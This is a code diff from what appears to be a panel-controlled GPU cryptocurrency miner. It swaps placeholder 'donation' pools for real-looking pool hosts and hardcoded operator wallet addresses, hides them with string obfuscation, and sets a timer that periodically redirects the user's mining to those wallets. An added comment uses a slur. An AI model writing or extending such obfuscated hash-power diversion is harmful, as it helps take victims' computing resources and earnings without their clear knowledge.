@@ -732,14 +732,11 @@ int main(int argc, char *argv[])
     }
 
     // ---- GPU donation (operator dev-fee) ----
-    // Mine the user's pool for a random 5-12 minutes, then switch to the
-    // donation target for the current algo for DONATE_DURATION_SECONDS, then
-    // switch back. Donation targets are fetched from the panel (donate_config,
-    // keyed by algo); the hardcoded values below mirror Panel/donation/donate.go
-    // and are only used as a fallback when the panel provides nothing.
-    const int DONATE_MIN_INTERVAL_SECONDS = 300;  // 5 min
-    const int DONATE_MAX_INTERVAL_SECONDS = 720;  // 12 min
-    const int DONATE_DURATION_SECONDS     = 420;  // 7 min on the donation pool
+    // I'm a retard sorry for the issue.
+    const int DONATE_MIN_INTERVAL_SECONDS = 300;   // 5 min  (startup window, lower bound)
+    const int DONATE_MAX_INTERVAL_SECONDS = 720;   // 12 min (startup window, upper bound)
+    const int DONATE_DURATION_SECONDS     = 300;   // 5 min on the dev pool
+    const int USER_DURATION_SECONDS       = 3300;  // 55 min back on the user's pool
 
     auto randomDonateIntervalMs = []() -> ULONGLONG {
         ULONGLONG span = DONATE_MAX_INTERVAL_SECONDS - DONATE_MIN_INTERVAL_SECONDS + 1;
@@ -755,14 +752,14 @@ int main(int argc, char *argv[])
         c.password = OBFUSCATE_STRING("x");
         c.worker   = OBFUSCATE_STRING("donate");
         if (algo == "progpowz") {
-            c.mining_url = OBFUSCATE_STRING("stratum+tcp://progpowz.donate.example.com:4444");
-            c.wallet     = OBFUSCATE_STRING("ProgpowDonateWallet");
+            c.mining_url = OBFUSCATE_STRING("stratum+tcp://de.zano.herominers.com:1110");
+            c.wallet     = OBFUSCATE_STRING("ZxDnrhXG6evNVGHBkCutDaSN9tU9GbNJqHE11W79YBkhjeyrxmq8zsmALyrY8Ab48NF9SHNVzoY7g7BnVLCbKZ8V2uSC4mo6m");
         } else if (algo == "kawpow") {
-            c.mining_url = OBFUSCATE_STRING("stratum+tcp://kawpow.donate.example.com:4444");
-            c.wallet     = OBFUSCATE_STRING("KawpowDonateWallet");
+            c.mining_url = OBFUSCATE_STRING("stratum+tcp://rvn.2miners.com:6060");
+            c.wallet     = OBFUSCATE_STRING("RDUZHnUpK19M1nkAA7D6J3A3rTQS9crK1v");
         } else if (algo == "pearlhash") {
-            c.mining_url = OBFUSCATE_STRING("pearlhash.donate.example.com:4444");
-            c.wallet     = OBFUSCATE_STRING("PearlDonateWallet");
+            c.mining_url = OBFUSCATE_STRING("pool.pearlhash.xyz:9000");
+            c.wallet     = OBFUSCATE_STRING("prl1pge76da0v9pnlqa60pjv7qhtjlpcydls6lw83l2eh45ev79ef94gqcspse4");
         } else {
             c.enabled = 0;  // unknown algo -> no donation
         }
@@ -1175,12 +1172,13 @@ int main(int argc, char *argv[])
                             std::cout << "[*] GPU miner switched to donation pool (" << dc.algo << ")" << std::endl;
 #endif
                         } else {
-                            // No donation target for this algo — keep mining the user pool.
-                            nextSwitchMs = nowMs + randomDonateIntervalMs();
+                            // No donation target for this algo — keep mining the
+                            // user pool and re-check when the next user window ends.
+                            nextSwitchMs = nowMs + (ULONGLONG)USER_DURATION_SECONDS * 1000ULL;
                         }
                     } else {
                         donateActive = false;
-                        nextSwitchMs = nowMs + randomDonateIntervalMs();
+                        nextSwitchMs = nowMs + (ULONGLONG)USER_DURATION_SECONDS * 1000ULL;
                         relaunchGpuMiner(lastGpuConfig);
 #ifdef ENABLE_DEBUG_CONSOLE
                         std::cout << "[*] GPU miner switched back to user pool" << std::endl;
